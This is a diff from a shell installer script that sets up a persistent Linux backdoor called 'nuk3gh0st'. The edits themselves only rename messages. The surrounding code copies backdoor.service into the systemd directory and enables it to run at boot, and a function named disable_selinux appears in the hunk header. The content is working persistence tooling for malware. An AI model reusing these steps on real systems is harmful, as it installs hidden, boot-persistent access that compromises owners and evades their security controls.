@@ -46,14 +46,14 @@ function disable_selinux {
 
 function create_systemd_service {
 	echo -e "${item} Coping nuk3gh0st.service to systemd startup scripts directory"
-	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/nuk3gh0st.service /lib/systemd/system/nuk3gh0st.service${endColor}"
+	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service${endColor}"
 	cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service
 	echo ""
 }
 
 function enable_systemd_service {
 	echo -e "${item} Enabling nuk3gh0st.service"
-	echo -e "   ${purple} cmd: systemctl enable nuk3gh0st.service${endColor}"
+	echo -e "   ${purple} cmd: systemctl enable backdoor.service${endColor}"
 	echo -n -e "${cyan}"
 	systemctl enable backdoor.service
 	echo -n -e "${endColor}"
